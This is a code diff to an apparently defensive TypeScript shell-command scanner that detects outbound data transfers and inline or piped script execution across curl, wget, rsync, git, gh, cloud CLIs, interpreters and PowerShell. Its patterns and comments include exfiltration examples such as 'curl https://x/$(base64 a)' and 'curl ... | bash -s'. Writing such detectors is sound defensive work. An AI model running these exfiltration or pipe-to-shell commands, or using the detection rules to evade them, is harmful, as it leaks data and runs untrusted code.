@@ -81,10 +81,10 @@ export interface ShellScan {
 const CHANGES_DIRECTORY = new Set(['cd', 'chdir', 'pushd', 'popd']);
 const COPIES = new Set(['cp', 'mv', 'install', 'ln', 'rsync', 'scp']);
 // The short flag may close a cluster (`-fsSLo`, `-qO`); curl's `-O` names no path, so case matters.
-const DOWNLOAD_OUTPUT: Record<string, { long: string; short: RegExp }> = {
-  curl: { long: '--output', short: /^-[a-zA-Z]*?o(.*)$/ },
-  wget: { long: '--output-document', short: /^-[a-zA-Z]*?O(.*)$/ },
-};
+const DOWNLOAD_OUTPUT = new Map<string, { long: string; short: RegExp }>([
+  ['curl', { long: '--output', short: /^-[a-zA-Z]*?o(.*)$/ }],
+  ['wget', { long: '--output-document', short: /^-[a-zA-Z]*?O(.*)$/ }],
+]);
 const GIT_CONFIG_SETS =
   /^(set|unset|edit|-e|--edit|--add|--unset|--unset-all|--replace-all|--rename-section|--remove-section|rename-section|remove-section)$/;
 
@@ -447,8 +447,14 @@ const WRAPPERS: ReadonlyMap<string, Wrapper> = new Map([
 
 const NO_OPTIONS: Wrapper = { values: '' };
 
+/** A program's name as the scan looks it up: `/usr/bin/curl`, `curl.exe` and `CURL.EXE` are all `curl`. */
+export const programName = (executable: string): string =>
+  basename(executable)
+    .toLowerCase()
+    .replace(/\.exe$/, '');
+
 /** Whether a word names a wrapper (`sudo`, `/usr/bin/env`). */
-export const isWrapper = (word: string): boolean => WRAPPERS.has(basename(unquote(word)));
+export const isWrapper = (word: string): boolean => WRAPPERS.has(programName(unquote(word)));
 
 /**
  * Whether long option `given` takes the next word, read as getopt_long reads it: an exact name, or
@@ -500,7 +506,7 @@ function wrapperOptionsEnd(name: string, tokens: readonly string[], from: number
  * duration. The end of `tokens` when the wrapper runs nothing.
  */
 export function pastWrapper(tokens: readonly string[], at: number): number {
-  const name = basename(unquote(tokens[at] ?? ''));
+  const name = programName(unquote(tokens[at] ?? ''));
   const wrapper = WRAPPERS.get(name);
   const end = wrapperOptionsEnd(name, tokens, at + 1);
   const describes = wrapper?.describes ?? '';
@@ -528,16 +534,16 @@ export function requiresExactShellRule(command: string): boolean {
   const head = /^(?:"([^"]*)"|'([^']*)'|(\S+))(?:\s+|$)/.exec(command);
   if (!head) return true;
   const executable = head[1] ?? head[2] ?? head[3];
-  const program = basename(executable);
+  const name = programName(executable);
   const argumentsText = command.slice(head[0].length);
   return (
     // Quoting or an absolute executable defeats arityPrefix's bare-program lookup.
     head[1] !== undefined ||
     head[2] !== undefined ||
-    executable !== program ||
-    WRAPPERS.has(program) ||
-    /^(curl|wget|rsync|aws|gsutil|gcloud|docker|podman)$/.test(program) ||
-    (program === 'gh' &&
+    executable !== basename(executable) ||
+    WRAPPERS.has(name) ||
+    /^(curl|wget|rsync|aws|gsutil|gcloud|docker|podman)$/.test(name) ||
+    (name === 'gh' &&
       (/^(?:api|"api"|'api')(?:\s|$)/.test(argumentsText) || !/^[A-Za-z]+\s+[A-Za-z]+(?:\s|$)/.test(argumentsText)))
   );
 }
@@ -554,18 +560,22 @@ const WGET_SENDS = /^--(post|body)/;
 const DASH_C = /^-[a-zA-Z]*c/;
 // Shells read `+c` like `-c` (`bash +ec '...'` runs the script); python reads `+c` as a file name.
 const SHELL_C = /^[+-][a-zA-Z]*c/;
-const INLINE_SCRIPT: Record<string, RegExp> = {
-  node: /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/,
-  ruby: /^-[a-zA-Z]*e/,
-  perl: /^-[a-zA-Z]*[eE]/,
-  php: /^-r/,
-  bun: /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/,
-  osascript: /^-e/,
-  sh: SHELL_C,
-  bash: SHELL_C,
-  zsh: SHELL_C,
-  dash: SHELL_C,
-};
+const INLINE_SCRIPT = new Map<string, RegExp>([
+  ['node', /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/],
+  ['ruby', /^-[a-zA-Z]*e/],
+  ['perl', /^-[a-zA-Z]*[eE]/],
+  ['php', /^-r/],
+  ['bun', /^(-[a-zA-Z]*[ep]|--eval|--print)(=|$)/],
+  ['osascript', /^-e/],
+  ['sh', SHELL_C],
+  ['bash', SHELL_C],
+  ['zsh', SHELL_C],
+  ['dash', SHELL_C],
+]);
+
+/** The option that makes interpreter `name` run a script given inline, as `-c` for python. */
+const inlineScriptOption = (name: string): RegExp | undefined =>
+  /^python[\d.]*$/.test(name) ? DASH_C : INLINE_SCRIPT.get(name);
 
 /** PowerShell's switch for a command string: any prefix of -Command, -CommandWithArgs or -EncodedCommand. */
 function powershellCommand(arg: string): boolean {
@@ -584,55 +594,55 @@ const WINDOWS_INLINE_SCRIPT = new Map<string, (arg: string) => boolean>([
   ['pwsh', powershellCommand],
 ]);
 
-const windowsInlineScript = (program: string) => WINDOWS_INLINE_SCRIPT.get(program.toLowerCase().replace(/\.exe$/, ''));
+const windowsInlineScript = (name: string) => WINDOWS_INLINE_SCRIPT.get(name);
 
 /**
  * The option letters whose value is glued to the flag, so a letter after one is that value rather
  * than another flag: `ruby -rset` loads the library `set`, it does not run `-e`. Only list letters
  * the interpreter documents as taking a value.
  */
-const OPTION_VALUE_LETTERS: Record<string, string> = {
-  python: 'WX',
-  node: 'rC',
-  bun: 'rld',
-  perl: 'IMmx',
-  ruby: 'rICEKFx',
-  osascript: 'ls',
-  zsh: 'oO',
-};
+const OPTION_VALUE_LETTERS = new Map([
+  ['python', 'WX'],
+  ['node', 'rC'],
+  ['bun', 'rld'],
+  ['perl', 'IMmx'],
+  ['ruby', 'rICEKFx'],
+  ['osascript', 'ls'],
+  ['zsh', 'oO'],
+]);
 
 /**
  * Value letters that take only a glued value (`ruby -xdir`): even at the end of a cluster they do
  * not swallow the next word, so a script's own `-e` after `ruby -x script.rb` is not ruby's option.
  */
-const GLUED_ONLY_LETTERS: Record<string, string> = {
-  perl: 'x',
-  ruby: 'xKF',
-};
+const GLUED_ONLY_LETTERS = new Map([
+  ['perl', 'x'],
+  ['ruby', 'xKF'],
+]);
 
 /** The long forms of the above whose value is the next argument rather than glued to the flag. */
-const OPTION_VALUE_WORDS: Record<string, readonly string[]> = {
-  node: ['--require', '--import'],
-  bun: ['--require', '--preload'],
-  bash: ['--rcfile', '--init-file'],
-};
+const OPTION_VALUE_WORDS = new Map<string, readonly string[]>([
+  ['node', ['--require', '--import']],
+  ['bun', ['--require', '--preload']],
+  ['bash', ['--rcfile', '--init-file']],
+]);
 
 /** Common long options that take no value, so the word after one is not assumed to be its value. */
-const OPTION_FLAG_WORDS: Record<string, readonly string[]> = {
-  node: ['--inspect', '--inspect-brk', '--watch', '--enable-source-maps', '--no-warnings', '--trace-warnings'],
-  bun: ['--watch', '--hot', '--smol'],
-};
+const OPTION_FLAG_WORDS = new Map<string, readonly string[]>([
+  ['node', ['--inspect', '--inspect-brk', '--watch', '--enable-source-maps', '--no-warnings', '--trace-warnings']],
+  ['bun', ['--watch', '--hot', '--smol']],
+]);
 
 /** Shells where -o/-O (and +o/+O) name an option in the next word, leaving the rest of the cluster as flags. */
 const SHELL_OPTION_WORD = new Set(['sh', 'bash', 'dash']);
 
 function optionValueLetters(program: string): string {
-  return /^python[\d.]*$/.test(program) ? OPTION_VALUE_LETTERS.python : (OPTION_VALUE_LETTERS[program] ?? '');
+  return OPTION_VALUE_LETTERS.get(/^python[\d.]*$/.test(program) ? 'python' : program) ?? '';
 }
 
 /** The value letters that take the next word when they end a cluster; glued-only letters do not. */
 function nextWordLetters(program: string): string {
-  const glued = GLUED_ONLY_LETTERS[program] ?? '';
+  const glued = GLUED_ONLY_LETTERS.get(program) ?? '';
   return [...optionValueLetters(program)].filter(letter => !glued.includes(letter)).join('');
 }
 
@@ -645,7 +655,7 @@ function flagRun(arg: string, letters: string): string {
 
 /** Whether an option takes its value in the next argument rather than glued to its flag. */
 function takesNextArgument(program: string, arg: string): boolean {
-  if (arg.startsWith('--')) return !arg.includes('=') && (OPTION_VALUE_WORDS[program] ?? []).includes(arg);
+  if (arg.startsWith('--')) return !arg.includes('=') && (OPTION_VALUE_WORDS.get(program) ?? []).includes(arg);
   const cluster = arg.slice(1);
   const letters = nextWordLetters(program);
   const at = [...cluster].findIndex(char => letters.includes(char));
@@ -669,7 +679,7 @@ function interpreterOptions(program: string, args: readonly string[]): { options
   const letters = optionValueLetters(program);
   const shellWord = SHELL_OPTION_WORD.has(program);
   // Shells also take flags as `+e`, which turn an option off rather than ending the options.
-  const plusFlags = INLINE_SCRIPT[program] === SHELL_C;
+  const plusFlags = INLINE_SCRIPT.get(program) === SHELL_C;
   const options: string[] = [];
   let i = 0;
   for (; i < args.length; i++) {
@@ -689,7 +699,7 @@ function interpreterOptions(program: string, args: readonly string[]): { options
       arg.startsWith('--') &&
       arg !== '--' &&
       !arg.includes('=') &&
-      !(OPTION_FLAG_WORDS[program] ?? []).includes(arg) &&
+      !(OPTION_FLAG_WORDS.get(program) ?? []).includes(arg) &&
       plainWord(args[i + 1])
     ) {
       i++;
@@ -713,21 +723,21 @@ export function opaqueForm(tokens: readonly string[]): string | null {
   const start = wrappedStart(normalised);
   const executable = normalised[start];
   if (executable === undefined) return null;
-  const program = basename(executable);
+  const name = programName(executable);
   const args = normalised.slice(start + 1);
   const head = (count: number) => tokens.slice(0, start + count).join(' ');
-  if (program === 'eval' || program === 'source' || program === '.') return head(1);
-  if (program === 'deno' && args[0] === 'eval') return head(2);
-  const windowsInline = windowsInlineScript(program);
+  if (name === 'eval' || name === 'source' || name === '.') return head(1);
+  if (name === 'deno' && args[0] === 'eval') return head(2);
+  const windowsInline = windowsInlineScript(name);
   if (windowsInline) {
     const at = args.findIndex(windowsInline);
     return at === -1 ? null : head(2 + at);
   }
-  const inline = /^python[\d.]*$/.test(program) ? DASH_C : INLINE_SCRIPT[program];
-  if (!inline && !STDIN_SCRIPT.test(program)) return null;
-  const { options, operands } = interpreterOptions(program, args);
+  const inline = inlineScriptOption(name);
+  if (!inline && !STDIN_SCRIPT.test(name)) return null;
+  const { options, operands } = interpreterOptions(name, args);
   if (inline && options.some(option => inline.test(option))) {
-    return head(2 + args.findIndex(arg => inline.test(flagRun(arg, optionValueLetters(program)))));
+    return head(2 + args.findIndex(arg => inline.test(flagRun(arg, optionValueLetters(name)))));
   }
   return operands.length === 0 || operands[0] === '-' || STDIN_SCRIPT_ARG.test(operands[0]) ? head(1) : null;
 }
@@ -798,13 +808,15 @@ export function outboundReason(raw: readonly string[], stdin = false): string | 
   const tokens = raw.map(unquote);
   const start = wrappedStart(tokens);
   if (start >= tokens.length) return null;
+  // As written, for the reason shown; `name` is what the program is looked up by.
   const program = basename(tokens[start]);
+  const name = programName(tokens[start]);
   const args = tokens.slice(start + 1);
   // Any computed argument: `curl https://x/$(base64 a)` sends the file in a GET.
   const computed = raw.slice(start + 1).some(isDynamic);
 
-  if (ALWAYS_OUTBOUND.has(program)) return program;
-  if (program === 'curl') {
+  if (ALWAYS_OUTBOUND.has(name)) return program;
+  if (name === 'curl') {
     const flag = args.find(
       arg => CURL_SENDS.test(arg.split('=')[0]) || (!/^-[a-zA-Z]*X/.test(arg) && /^-[a-zA-Z]*[dFTK]/.test(arg))
     );
@@ -829,18 +841,18 @@ export function outboundReason(raw: readonly string[], stdin = false): string | 
     if (sendsBody(method)) return 'curl --request';
     return computed ? 'curl with a computed argument' : null;
   }
-  if (program === 'wget') {
+  if (name === 'wget') {
     const flag = args.find(arg => WGET_SENDS.test(arg.split('=')[0]));
     if (flag) return `wget ${flag.split('=')[0]}`;
     if (sendsBody(optionValue(args, ['--method']))) return 'wget --method';
     return computed ? 'wget with a computed argument' : null;
   }
-  if (program === 'rsync') {
+  if (name === 'rsync') {
     return args.some(arg => !arg.startsWith('-') && (/^[^/]*:/.test(arg) || arg.startsWith('rsync://')))
       ? 'rsync to a remote host'
       : null;
   }
-  if (program === 'git') {
+  if (name === 'git') {
     const words: string[] = [];
     for (let i = 0; i < args.length; i++) {
       if (args[i] === '-C' || args[i] === '-c') i++;
@@ -853,7 +865,7 @@ export function outboundReason(raw: readonly string[], stdin = false): string | 
     if (sub === 'remote' && (action === 'add' || action === 'set-url')) return `git remote ${action}`;
     return null;
   }
-  if (program === 'gh') {
+  if (name === 'gh') {
     const [sub, action] = args.filter(arg => !arg.startsWith('-'));
     if ((sub === 'gist' && (action === 'create' || action === 'edit')) || (sub === 'release' && action === 'upload')) {
       return `gh ${sub} ${action}`;
@@ -872,38 +884,38 @@ export function outboundReason(raw: readonly string[], stdin = false): string | 
     const fields = apiArgs.some(arg => /^-[fF]|^--(field|raw-field|input)(=|$)/.test(arg));
     return fields && !(action === 'graphql' && graphqlReadOnly(apiArgs)) ? 'gh api' : null;
   }
-  if (program === 'aws' || program === 'gsutil' || program === 'gcloud') {
+  if (name === 'aws' || name === 'gsutil' || name === 'gcloud') {
     const positional = args.filter(arg => !arg.startsWith('-'));
     const copies = positional.some(arg => /^(cp|mv|sync|rsync)$/.test(arg));
     if (copies && /^(s3|gs):\/\//.test(positional.at(-1) ?? '')) return `${program} upload`;
     return positional.includes('put-object') ? `${program} put-object` : null;
   }
-  if (program === 'docker' || program === 'podman') {
+  if (name === 'docker' || name === 'podman') {
     return args.find(arg => !arg.startsWith('-')) === 'push' ? `${program} push` : null;
   }
-  if (program === 'deno') return args[0] === 'eval' ? 'deno eval' : null;
-  if (program === 'eval') return 'eval';
+  if (name === 'deno') return args[0] === 'eval' ? 'deno eval' : null;
+  if (name === 'eval') return 'eval';
   // A name built from a command substitution carries what it read into the lookup itself.
-  if (RESOLVERS.has(program) && computed) return `${program} with a computed argument`;
-  const windowsInline = windowsInlineScript(program);
+  if (RESOLVERS.has(name) && computed) return `${program} with a computed argument`;
+  const windowsInline = windowsInlineScript(name);
   const windowsSwitch = windowsInline ? args.find(windowsInline) : undefined;
   if (windowsSwitch !== undefined) return `${program} ${windowsSwitch}`;
-  const inlineScript = /^python[\d.]*$/.test(program) ? DASH_C : INLINE_SCRIPT[program];
+  const inlineScript = inlineScriptOption(name);
   // A script's own arguments are not options: `python3 x.py -config` never runs an inline script.
-  const { options, operands } = interpreterOptions(program, args);
+  const { options, operands } = interpreterOptions(name, args);
   const inline = inlineScript ? options.find(arg => inlineScript.test(arg)) : undefined;
   if (inline) return `${program} ${(inlineScript?.exec(inline)?.[0] ?? inline.split('=')[0]).replace(/=$/, '')}`;
   // `bash -s` reads its script from stdin even when operands follow, as `curl ... | bash -s -- arg`.
   const scriptOperand =
-    INLINE_SCRIPT[program] === SHELL_C && options.some(arg => /^[+-][a-zA-Z]*s/.test(arg)) ? '-' : operands[0];
+    INLINE_SCRIPT.get(name) === SHELL_C && options.some(arg => /^[+-][a-zA-Z]*s/.test(arg)) ? '-' : operands[0];
   if (
     stdin &&
-    STDIN_SCRIPT.test(program) &&
+    STDIN_SCRIPT.test(name) &&
     (scriptOperand === undefined || scriptOperand === '-' || STDIN_SCRIPT_ARG.test(scriptOperand))
   ) {
     return `${program} reading a script from stdin`;
   }
-  if ((program === 'npm' || program === 'pnpm' || program === 'yarn') && args.includes('publish')) {
+  if ((name === 'npm' || name === 'pnpm' || name === 'yarn') && args.includes('publish')) {
     return `${program} publish`;
   }
   return null;
@@ -1610,7 +1622,7 @@ export async function scanShell(
       const operands = rest.filter(arg => !arg.startsWith('-'));
       if (program === 'tee') for (const operand of operands) noteWrite(operand);
       for (const [index, arg] of rest.entries()) {
-        const output = DOWNLOAD_OUTPUT[program];
+        const output = DOWNLOAD_OUTPUT.get(program);
         const value = !output
           ? undefined
           : arg === output.long
